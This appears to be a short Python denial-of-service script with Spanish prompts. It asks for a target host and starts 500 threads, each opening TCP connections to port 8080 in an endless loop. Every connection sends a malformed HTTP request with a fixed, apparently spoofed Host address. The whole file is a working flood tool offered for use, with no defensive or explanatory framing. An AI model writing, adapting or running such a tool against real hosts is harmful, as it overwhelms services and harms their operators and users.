import threading
import socket
import os
import time

obj  = input('Objetivo: ')
p    = 8080
mac   = '182.21.20.32'

cnex = 0

def onPing():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((obj, p))
        s.sendto(("GET /" + obj + "HTTP/1.1\r\n").encode('ascii'), (obj, p))
        s.sendto(("Host: " + mac + "\r\n\r\n").encode('ascii'), (obj, p))
        s.close()
        
        global cnex
        cnex += 1
        if cnex % 500 == 0:
            print(cnex, end="\r")


for i in range(500):
    thread = threading.Thread(target = onPing)
    thread.start()